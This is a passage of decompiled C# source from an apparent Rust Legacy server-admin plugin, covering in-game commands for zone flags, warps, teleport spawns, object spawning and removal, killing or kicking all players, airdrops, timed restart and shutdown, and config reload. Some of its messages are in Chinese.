					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "You cannot teleport to zone because have not completed new zone.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (worldZone.Spawns.Count == 0)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not have spawn points for teleport.", 5f);
						return;
					}
					int index = UnityEngine.Random.Range(0, worldZone.Spawns.Count);
					Helper.TeleportTo(Sender, worldZone.Spawns[index]);
					return;
				}
				case "DELETE":
				case "REMOVE":
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "You cannot delete zone because have not completed new zone.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					Broadcast.Notice(Sender, "✎", "Zone \"" + worldZone.Name + "\" has been removed.", 5f);
					Zones.Delete(worldZone);
					return;
				case "SPAWN":
				case "SPAWNS":
				case "RAD":
				case "RADIATION":
				case "SAFE":
				case "PVP":
				case "DECAY":
				case "BUILD":
				case "TRADE":
				case "EVENT":
				case "CRAFT":
				case "NOENTER":
				case "NOLEAVE":
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (text.Equals("SPAWN"))
					{
						Vector3 position = Sender.playerClient.controllable.character.transform.position;
						worldZone.Spawns.Add(position);
						Broadcast.Notice(Sender, "✎", "Added new spawn for zone \"" + worldZone.Name + "\" at " + position.AsString(), 5f);
					}
					if (text.Equals("SPAWNS"))
					{
						Broadcast.Message(Sender, string.Concat(new object[]
						{
							"Zone \"",
							worldZone.Name,
							"\" have ",
							worldZone.Spawns.Count,
							" spawn(s)."
						}), null, 0f);
						for (int i = 0; i < worldZone.Spawns.Count; i++)
						{
							Broadcast.Message(Sender, string.Concat(new object[]
							{
								"Spawn #",
								i,
								": ",
								worldZone.Spawns[i].AsString()
							}), null, 0f);
						}
					}
					if (text.Equals("RAD") || text.Equals("RADIATION"))
					{
						if (worldZone.Radiation)
						{
							worldZone.Flags ^= ZoneFlags.radiation;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.radiation;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.Radiation ? "with" : "without",
							" radiation."
						}), 5f);
					}
					if (text.Equals("SAFE"))
					{
						if (worldZone.Safe)
						{
							worldZone.Flags ^= ZoneFlags.safe;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.safe;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.Safe ? "with" : "without",
							" safe."
						}), 5f);
					}
					if (text.Equals("PVP"))
					{
						if (worldZone.NoPvP)
						{
							worldZone.Flags ^= ZoneFlags.nopvp;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.nopvp;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.NoPvP ? "without" : "with",
							" PvP."
						}), 5f);
					}
					if (text.Equals("DECAY"))
					{
						if (worldZone.NoDecay)
						{
							worldZone.Flags ^= ZoneFlags.nodecay;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.nodecay;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.NoDecay ? "without" : "with",
							" decay."
						}), 5f);
					}
					if (text.Equals("BUILD"))
					{
						if (worldZone.NoBuild)
						{
							worldZone.Flags ^= ZoneFlags.nobuild;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.nobuild;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.NoBuild ? "without" : "with",
							" build."
						}), 5f);
					}
					if (text.Equals("TRADE"))
					{
						if (worldZone.CanTrade)
						{
							worldZone.Flags ^= ZoneFlags.trade;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.trade;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.CanTrade ? "with" : "without",
							" trade."
						}), 5f);
					}
					if (text.Equals("EVENT"))
					{
						if (worldZone.CanTrade)
						{
							worldZone.Flags ^= ZoneFlags.events;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.events;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.CanTrade ? "with" : "without",
							" event."
						}), 5f);
					}
					if (text.Equals("CRAFT"))
					{
						if (worldZone.NoCraft)
						{
							worldZone.Flags ^= ZoneFlags.nocraft;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.nocraft;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Zone \"",
							worldZone.Name,
							"\" now ",
							worldZone.CanTrade ? "with" : "without",
							" craft."
						}), 5f);
					}
					if (text.Equals("NOENTER"))
					{
						if (worldZone.NoEnter)
						{
							worldZone.Flags ^= ZoneFlags.noenter;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.noenter;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Players now ",
							worldZone.NoEnter ? "cannot" : "can",
							" enter into \"",
							worldZone.Name,
							"\" zone."
						}), 5f);
					}
					if (text.Equals("NOLEAVE"))
					{
						if (worldZone.NoLeave)
						{
							worldZone.Flags ^= ZoneFlags.noleave;
						}
						else
						{
							worldZone.Flags |= ZoneFlags.noleave;
						}
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Players now ",
							worldZone.NoLeave ? "cannot" : "can",
							" leave from \"",
							worldZone.Name,
							"\" zone."
						}), 5f);
					}
					Zones.SaveAsFile();
					return;
				case "COMMAND":
				case "CMD":
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone with name \"" + Args[0] + "\" not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (Args.Length < 2)
					{
						Broadcast.Message(Sender, "You must enter command name for enable/disable to use in this zone.", null, 0f);
						return;
					}
					if (worldZone.ForbiddenCommand.Contains(Args[2]))
					{
						worldZone.ForbiddenCommand = worldZone.ForbiddenCommand.Remove(Args[2]);
						Broadcast.Notice(Sender, "✎", string.Concat(new string[]
						{
							"Now command \"",
							Args[2],
							"\" CAN be used in a zone \"",
							worldZone.Name,
							"\""
						}), 5f);
						return;
					}
					worldZone.ForbiddenCommand = worldZone.ForbiddenCommand.Add(Args[2]);
					Broadcast.Notice(Sender, "✎", string.Concat(new string[]
					{
						"Now command \"",
						Args[2],
						"\" FORBIDDEN to use in a zone \"",
						worldZone.Name,
						"\""
					}), 5f);
					return;
				case "NAME":
					if (worldZone == null && !Zones.IsBuild)
					{
						Broadcast.Notice(Sender, "✘", "Zone with name \"" + Args[0] + "\" not exists", 5f);
						return;
					}
					if (Args.Length < 2)
					{
						Broadcast.Message(Sender, "You must enter new name of zone for change.", null, 0f);
						return;
					}
					if (Zones.IsBuild)
					{
						Zones.LastZone.Name = Args[2];
						Broadcast.Notice(Sender, "✎", "Current building zone now named \"" + Zones.LastZone.Name + "\".", 5f);
						return;
					}
					worldZone.Name = Args[2];
					Broadcast.Notice(Sender, "✎", string.Concat(new string[]
					{
						"Zone \"",
						worldZone.Defname,
						"\" now named of \"",
						worldZone.Name,
						"\"."
					}), 5f);
					return;
				case "WARP":
				{
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (Args.Length < 2)
					{
						Broadcast.Message(Sender, "You must enter defname of other zone for create warp.", null, 0f);
						return;
					}
					WorldZone worldZone2;
					if ((worldZone2 = Zones.Find(Args[2])) == null)
					{
						Broadcast.Notice(Sender, "✘", "Warp zone " + Args[2] + " not exists.", 5f);
						return;
					}
					worldZone2.WarpZone = worldZone;
					worldZone.WarpZone = worldZone2;
					Broadcast.Notice(Sender, "✎", string.Concat(new string[]
					{
						"Zones \"",
						worldZone2.Name,
						"\" and \"",
						worldZone.Name,
						"\" now linked for warp."
					}), 5f);
					return;
				}
				case "UNWARP":
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (worldZone.WarpZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Warp zone " + worldZone.Defname + " not have warp.", 5f);
						return;
					}
					Broadcast.Notice(Sender, "✎", string.Concat(new string[]
					{
						"Zones \"",
						worldZone.WarpZone.Name,
						"\" and \"",
						worldZone.Name,
						"\" has been unlinked."
					}), 5f);
					worldZone.WarpZone.WarpZone = null;
					worldZone.WarpZone = null;
					return;
				case "WARPTIME":
					if (worldZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
						return;
					}
					if (Zones.IsBuild)
					{
						Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
						Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
						return;
					}
					if (worldZone.WarpZone == null)
					{
						Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not have warp.", 5f);
						return;
					}
					if (Args.Length < 2)
					{
						Broadcast.Message(Sender, "You must enter number of seconds to warp.", null, 0f);
						return;
					}
					long.TryParse(Args[2], out worldZone.WarpTime);
					if (worldZone.WarpTime > 0L)
					{
						Broadcast.Notice(Sender, "✎", string.Concat(new object[]
						{
							"You set ",
							worldZone.WarpTime,
							" seconds to warp for \"",
							worldZone.Name,
							"\" zone."
						}), 5f);
						return;
					}
					Broadcast.Notice(Sender, "✎", "Zone \"" + worldZone.Name + "\" now without warp time.", 5f);
					return;
				}
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
			}
			else if (worldZone == null)
			{
				Broadcast.Message(Sender, "Zone: Not defined", null, 0f);
			}
			else
			{
				Broadcast.Message(Sender, string.Concat(new string[]
				{
					"Zone: ",
					worldZone.Name,
					" (",
					worldZone.Defname,
					")"
				}), null, 0f);
				Broadcast.Message(Sender, "Flags: " + worldZone.Flags.ToString().Replace(" ", ""), null, 0f);
				Broadcast.Message(Sender, "Center: " + worldZone.Center, null, 0f);
				Broadcast.Message(Sender, string.Concat(new object[]
				{
					"Points: ",
					worldZone.Points.Count,
					", Spawns: ",
					worldZone.Spawns.Count
				}), null, 0f);
				if (worldZone.WarpZone != null)
				{
					Broadcast.Message(Sender, "Warp Zone: " + worldZone.WarpZone.Defname, null, 0f);
					Broadcast.Message(Sender, "Warp Time: " + worldZone.WarpTime, null, 0f);
				}
			}
		}

		public static void Spawn(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				int count = 1;
				if (Args.Length > 1 && !int.TryParse(Args[1], out count))
				{
					count = 1;
				}
				Vector3 position;
				if (!World.LookAtPosition(Sender.playerClient, out position, 100f))
				{
					Broadcast.Message(Sender, "Spawn distance too far away.", null, 0f);
				}
				else
				{
					try
					{
						GameObject gameObject = World.Spawn(Args[0], position, UnityEngine.Quaternion.Euler(0f, UnityEngine.Random.Range(0f, 360f), 0f), count);
						string text = gameObject.name.Replace("(Clone)", "").Replace("_A", "").Replace("Mutant", "Mutant ");
						if (text.EndsWith("A", StringComparison.Ordinal))
						{
							text = text.Substring(0, text.Length - 1);
						}
						Broadcast.Message(Sender, "You spawn " + text + ".", null, 0f);
					}
					catch (Exception ex)
					{
						Helper.LogError(ex.ToString(), true);
						NetMainPrefab[] array = Bundling.LoadAll<NetMainPrefab>();
						NetMainPrefab[] array2 = array;
						for (int i = 0; i < array2.Length; i++)
						{
							NetMainPrefab netMainPrefab = array2[i];
							ConsoleSystem.Print("Prefab: " + netMainPrefab.name, false);
						}
					}
				}
			}
		}

		public static void Remove(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length > 0 && Args[0] != "1")
			{
				int num = Helper.RemoveAllObjects(Args[0]);
				if (Sender != null)
				{
					Broadcast.Message(Sender, string.Concat(new object[]
					{
						"[COLOR#FF5F5F]Removed ",
						num,
						" object(s) with name \"",
						Args[0],
						"\"."
					}), null, 0f);
				}
			}
			else if (Sender != null)
			{
				GameObject lookObject = Helper.GetLookObject(Helper.GetLookRay(Sender), 100f, -1);
				if (lookObject == null || lookObject.collider is TerrainCollider || lookObject.CompareTag("Tree Collider"))
				{
					Broadcast.Notice(Sender, "✘", "Where nothing for remove", 3f);
				}
				else if (lookObject.name.IsEmpty())
				{
					Broadcast.Notice(Sender, "✘", "Where nothing for remove", 3f);
				}
				else
				{
					string str = Helper.NiceName(lookObject.name);
					bool force = Args != null && Args.Length > 0 && Args[0] == "1";
					if (Helper.RemoveObject(lookObject, force))
					{
						Broadcast.Message(Sender, "[COLOR#FF5F5F]Object \"" + str + "\" removed.", null, 0f);
					}
					else
					{
						Broadcast.Message(Sender, "Object \"" + str + "\" cannot be removed.", null, 0f);
					}
				}
			}
		}

		public static void KillAll(ConsoleSystem.Arg arg)
		{
			foreach (PlayerClient current in PlayerClient.All)
			{
				if (current.controllable.character != null)
				{
					TakeDamage.KillSelf(current.controllable.character, null);
				}
			}
			Broadcast.NoticeAll("☢", "所有玩家在服务器上已死亡.", null, 5f);
			Helper.Log("All players was killed by \"" + arg.argUser.displayName + "\".", true);
		}

		public static void KickAll(ConsoleSystem.Arg arg)
		{
			RustServerManagement.Get().KickAllPlayers();
			Helper.Log("所有玩家被踢 操作者: \"" + arg.argUser.displayName + "\".", true);
		}

		public static void Airdrop(NetUser Sender, string Command, string[] Args)
		{
			if (Args.Length == 0)
			{
				SupplyDropZone.CallAirDrop();
			}
			else
			{
				PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
				if (playerClient == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
					return;
				}
				Character character;
                if (!Character.FindByUser(playerClient.userID, out character))
				{
					return;
				}
				SupplyDropZone.CallAirDropAt(character.rigidbody.position);
			}
			if (Core.AirdropAnnounce)
			{
				Broadcast.MessageAll(Config.GetMessage("Airdrop.Incoming", Sender, null));
			}
		}

		public static void Restart(NetUser Sender, string Cmd, string[] Args)
		{
			if (!Core.HasShutdown)
			{
				if (Args != null && Args.Length > 0)
				{
					int.TryParse(Args[0], out serv.ShutdownTime);
				}
				if (serv.ShutdownTime == 0)
				{
					serv.ShutdownTime = Core.RestartTime;
				}
				serv.ShutdownLeft = serv.ShutdownTime;
				Core.HasShutdown = true;
				serv.RestartEvent = new EventTimer
				{
					Interval = 1000.0,
					AutoReset = true
				};
				Timer restartEvent = serv.RestartEvent;
				if (Commands.elapsedEventHandler_0 == null)
				{
					Commands.elapsedEventHandler_0 = new ElapsedEventHandler(Commands.smethod_3);
				}
				restartEvent.Elapsed += Commands.elapsedEventHandler_0;
				serv.RestartEvent.Start();
				Broadcast.Notice(Sender, "☢", "准备服务器重新启动 " + serv.ShutdownTime + " seconds.", 5f);
			}
			else if (serv.RestartEvent != null && serv.ShutdownLeft > 10)
			{
				Broadcast.Notice(Sender, "☢", "服务器关机重启已停止.", 5f);
				Broadcast.NoticeAll("☢", "服务器关机重启已停止.", Sender, 5f);
				serv.RestartEvent.Stop();
				serv.RestartEvent.Dispose();
				serv.RestartEvent = null;
				Core.HasShutdown = false;
			}
			else
			{
				Broadcast.Notice(Sender, "☢", "关机服务器.", 5f);
			}
		}

		public static void Shutdown(NetUser Sender, string Cmd, string[] Args)
		{
			if (!Core.HasShutdown)
			{
				if (Args != null && Args.Length > 0)
				{
					int.TryParse(Args[0], out serv.ShutdownTime);
				}
				if (serv.ShutdownTime == 0)
				{
					serv.ShutdownTime = Core.ShutdownTime;
				}
				serv.ShutdownLeft = serv.ShutdownTime;
				Core.HasShutdown = true;
				serv.ShutdownEvent = new EventTimer
				{
					Interval = 1000.0,
					AutoReset = true
				};
				Timer shutdownEvent = serv.ShutdownEvent;
				if (Commands.elapsedEventHandler_1 == null)
				{
					Commands.elapsedEventHandler_1 = new ElapsedEventHandler(Commands.smethod_4);
				}
				shutdownEvent.Elapsed += Commands.elapsedEventHandler_1;
				serv.ShutdownEvent.Start();
				Broadcast.Notice(Sender, "☢", "Preparing to server shutdown for " + serv.ShutdownTime + " seconds.", 5f);
			}
			else if (serv.ShutdownEvent != null && serv.ShutdownLeft > 10)
			{
				Broadcast.Notice(Sender, "☢", "Server shutdown has been stopped.", 5f);
				Broadcast.NoticeAll("☢", "Server shutdown has been stopped.", null, 5f);
				serv.ShutdownEvent.Stop();
				serv.ShutdownEvent.Dispose();
				serv.ShutdownEvent = null;
				Core.HasShutdown = false;
			}
			else
			{
				Broadcast.Notice(Sender, "☢", "Server during the shutdown for restart.", 5f);
			}
		}

		public static void ConfigManage(NetUser Sender, string Command, string[] Args)
		{
			if (Args != null && Args.Length > 0)
			{
				string a;
				if ((a = Args[0]) != null && a == "reload")
				{
					Config.Initialize();
					Economy.Initialize();
					Core.InitializeLoadout();
					if (!Config.Initialized)
					{
						Broadcast.Notice(Sender, "✘", "服务器管理：初始化配置的错误.", 5f);
					}
					else if (!Economy.Initialized)
					{
						Broadcast.Notice(Sender, "✘", "服务器管理：初始化商店系统的错误.", 5f);
					}
					else if (!Core.LoadoutInitialized)
					{
						Broadcast.Notice(Sender, "✘", "服务器管理：初始化错误出生系统.", 5f);
					}
					else
					{
						Broadcast.Notice(Sender, "✔", "服务器管理：配置已初始化.", 5f);
					}
				}
				else
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
				}
			}
		}

		[CompilerGenerated]
		private static bool smethod_0(string string_0)
		{
			return string_0.ToLower().StartsWith("rank");
		}

		[CompilerGenerated]
		private static bool smethod_1(string string_0)
		{
			return string_0.ToLower().StartsWith("countdown");
		}

		[CompilerGenerated]
		private static bool smethod_2(string string_0)
		{
			return string_0.ToLower().StartsWith("rank");
		}

		[CompilerGenerated]
		private static void smethod_3(object sender, ElapsedEventArgs e)
		{
			Events.EventServerRestart(serv.RestartEvent, serv.ShutdownTime, ref serv.ShutdownLeft);
		}

		[CompilerGenerated]
		private static void smethod_4(object sender, ElapsedEventArgs e)
		{
			Events.EventServerShutdown(serv.ShutdownEvent, serv.ShutdownTime, ref serv.ShutdownLeft);
		}
	}
}
